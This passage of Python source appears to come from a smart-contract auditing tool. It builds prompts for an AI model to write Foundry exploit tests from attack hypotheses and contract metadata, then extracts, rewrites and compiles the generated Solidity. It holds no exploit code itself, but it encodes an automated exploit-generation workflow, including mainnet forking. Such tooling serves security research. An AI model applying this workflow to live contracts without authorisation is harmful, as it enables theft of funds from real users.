            if isinstance(manifest, dict):
                return manifest
        manifest = contract_info.get("poc_manifest")
        if isinstance(manifest, dict):
            return manifest
        return None

    def _build_generation_prompt(self, hypothesis: AttackHypothesis, contract_source: str,
                                  contract_info: Dict[str, Any], retry_feedback: Optional[str] = None) -> str:
        """build prompt for ai poc generation"""
        name = contract_info.get("name", "Unknown")
        path = contract_info.get("path") or contract_info.get("file_path") or "Unknown"
        ext_funcs = contract_info.get("external_functions", []) or []
        ext_lines = "\n".join(f"    • {sig}" for sig in ext_funcs[:25]) or "    • (not reported)"
        priv_funcs = contract_info.get("privileged_functions", []) or []
        priv_lines = "\n".join(f"    • {sig}" for sig in priv_funcs[:25]) or "    • (not reported)"
        static_summary = contract_info.get("static_analysis_summary") or "(none supplied)"
        oracle_deps = contract_info.get("oracle_functions", []) or []
        token_flows = contract_info.get("token_flows", []) or []
        token_lines = "\n".join(
            f"    • {flow.get('function')} → {flow.get('flow_type')} {flow.get('amount_expression','?')} of {flow.get('token','unknown')}"
            for flow in token_flows[:10]) or "    • (not reported)"
        extra_candidates = [(sig or "").split("(", 1)[0] for sig in (contract_info.get("external_functions") or [])[:5]]
        snippets = gather_relevant_snippets(contract_source, hypothesis.target_function or "", hypothesis.steps or [], extra_candidates)
        snippet_block = self._format_snippet_block(snippets)
        source_import = contract_info.get("source_import")
        required_import = f'import {{{name}}} from "{self._remap_import(source_import)}";' if source_import and name else "(contract already available)"
        ext_funcs_detail = contract_info.get("external_functions_detail") or []
        if ext_funcs_detail:
            ext_detail_lines = []
            for fn in ext_funcs_detail[:25]:
                if isinstance(fn, dict):
                    fname, inputs, outputs = fn.get("name", "?"), fn.get("inputs", []), fn.get("outputs", [])
                    modifiers, is_payable = fn.get("modifiers", []), fn.get("is_payable", False)
                    param_str = ", ".join(f"{p.get('type', '?')} {p.get('name', '')}" for p in inputs) if inputs else ""
                    ret_str = ", ".join(p.get('type', '?') for p in outputs) if outputs else ""
                    sig = f"function {fname}({param_str})"
                    if is_payable:
                        sig += " payable"
                    if ret_str:
                        sig += f" returns ({ret_str})"
                    if modifiers:
                        sig += f"  // modifiers: {', '.join(modifiers)}"
                    ext_detail_lines.append(f"    • {sig}")
                else:
                    ext_detail_lines.append(f"    • {fn}")
            ext_lines_typed = "\n".join(ext_detail_lines) if ext_detail_lines else ext_lines
        else:
            ext_lines_typed = ext_lines
        state_vars = contract_info.get("state_vars") or contract_info.get("state_variables") or []
        state_var_lines = "\n".join(
            f"    • {sv}" if isinstance(sv, str) else f"    • {sv.get('type', '?')} {sv.get('name', '?')} ({sv.get('visibility', 'internal')})"
            for sv in state_vars[:15]) if state_vars else "    • (not reported)"
        events = contract_info.get("events") or []
        event_lines = "\n".join(f"    • event {e}" for e in events[:10]) if events else "    • (not reported)"

        metadata_block = f"""CONTRACT METADATA:
- Name: {name}, Path: {path}, Functions: {contract_info.get('total_functions', '?')}
- Flash-loan: {contract_info.get('flash_loan_capable', False)}, Oracle: {contract_info.get('has_oracle', False)}

FUNCTION SIGNATURES (use exact types):
{ext_lines_typed}

Privileged functions:
{priv_lines}

STATE VARIABLES:
{state_var_lines}

EVENTS:
{event_lines}

Static analysis: {static_summary}

Token flows:
{token_lines}

Oracle helpers:
{("\n".join(f'    • {fn}' for fn in oracle_deps)) if oracle_deps else "    • (not reported)"}

TARGET CONTRACT:
- Name: {name}
- Import: `{required_import}`
- NEVER redeclare {name}. Use existing modules from src/poc/ or dvd/**. NO npm packages.
- Single test contract inheriting ExploitTestBase.
"""
        system_context = contract_info.get("system_context")
        if system_context:
            metadata_block += f"""
MULTI-CONTRACT CONTEXT:
{system_context}

DEPLOYMENT: Deploy dependencies in setUp(). Use vm.createSelectFork for mainnet fork.
"""

        prompt = f"""Generate Foundry test exploiting:
Type: {hypothesis.attack_type}
Desc: {hypothesis.description}
Function: {hypothesis.target_function}

PRECONDITIONS: {chr(10).join(f"- {p}" for p in hypothesis.preconditions)}
STEPS: {chr(10).join(f"{i+1}. {step}" for i, step in enumerate(hypothesis.steps))}
IMPACT: {hypothesis.expected_impact}

{metadata_block}

{snippet_block}

SOURCE:
```solidity
{contract_source}
```

Requirements:
1. Setup, execute, validate (assertions)
2. Use ONLY listed functions
3. Match imports exactly
4. Realistic and executable
"""
        if retry_feedback:
            prompt += f"\n\nPREVIOUS FAILED:\n{retry_feedback}\n\nRegenerate fixing all issues."
        return prompt

    @staticmethod
    def _format_snippet_block(snippets: List[Tuple[str, str]]) -> str:
        if not snippets:
            return "SNIPPETS: (unable to locate)"
        lines = ["SNIPPETS:"]
        for name, snippet in snippets:
            lines.append(f"{name}:\n```solidity\n{snippet}\n```")
        return "\n".join(lines)

    def _extract_code_block(self, response: str, marker: str) -> str:
        """extract code from ai response"""
        pattern = rf'{marker}:\s*```(?:solidity)?\s*\n(.*?)```'
        match = re.search(pattern, response, re.DOTALL)
        return match.group(1).strip() if match else ""

    def _rewrite_import_paths(self, code: str, contract_info: Dict[str, Any]) -> str:
        """rewrite import paths"""
        contract_path_str = contract_info.get("file_path")
        if not contract_path_str:
            return code
        contract_path = Path(contract_path_str)
        if not contract_path.exists():
            return code
        output_dir, repo_root, src_root = self.output_dir, Path(__file__).resolve().parents[2], Path(__file__).resolve().parents[2] / "src"
        known_files = {contract_path.name: contract_path}
        for sibling in contract_path.parent.glob("*.sol"):
            known_files.setdefault(sibling.name, sibling)
        if contract_path.parent.parent.exists():
            for neighbor in contract_path.parent.parent.glob("*.sol"):
                known_files.setdefault(neighbor.name, neighbor)
        def _resolve(path_str: str) -> Optional[Path]:
            target_name = Path(path_str).name
            if target_name in known_files:
                return known_files[target_name]
            for found in src_root.rglob(target_name):
                return found
            return None
        def _replace(match: re.Match) -> str:
            full_stmt, import_target = match.group(1), match.group(2)
            if import_target.startswith(("src/", "training/", "poc/", "forge-std/", "openzeppelin/", "@")):
                return full_stmt
            if (output_dir / import_target).resolve().exists():
                return full_stmt
            resolved = _resolve(import_target)
            if not resolved or not resolved.exists() or not resolved.is_file() or resolved.suffix != '.sol':
                return full_stmt
            resolved_abs = resolved.resolve()
            allowed_roots = [repo_root.resolve(), output_dir.resolve(), src_root.resolve()]
            if not any(str(resolved_abs).startswith(str(root)) for root in allowed_roots):
                self.logger.warning(f"Path traversal: {resolved}")
                return full_stmt
            try:
                rel_repo = resolved.relative_to(repo_root).as_posix()
            except ValueError:
                rel_repo = os.path.relpath(resolved, output_dir)
            return full_stmt.replace(import_target, rel_repo)
        rewritten = re.compile(r"(^\s*import\s+[^;]*?\"([^\"\n]+)\")", re.MULTILINE).sub(_replace, code)
        spdx_match = re.match(r"\s*// SPDX-[^\n]*", rewritten)
        spdx_line = spdx_match.group(0).strip() if spdx_match else "// SPDX-License-Identifier: MIT"
        remainder = rewritten[spdx_match.end():] if spdx_match else rewritten
        remainder = re.sub(r"\s*pragma\s+solidity\s+[^;]+;\s*", "", remainder, count=1, flags=re.IGNORECASE)
        remainder = re.sub(r'\s*import\s*{[^}]*ExploitTestBase[^}]*}[^;]*;\s*', "", remainder, count=1, flags=re.IGNORECASE).lstrip()
        header_lines = self._HARNESS_HEADER.strip().splitlines()
        header_lines[0] = spdx_line
        return "\n".join(header_lines) + "\n\n" + remainder

    def _compile_solidity(self, solidity_path: Path) -> Tuple[bool, str]:
        repo_root = config.PROJECT_ROOT
        try:
            proc = subprocess.run(["forge", "build"], cwd=repo_root, capture_output=True, text=True, timeout=90)
        except FileNotFoundError:
            return True, "forge not found; skip"
        except subprocess.TimeoutExpired as exc:
            return False, f"forge timeout: {exc}"
        return proc.returncode == 0, proc.stderr.strip() or proc.stdout.strip() or "(no output)"
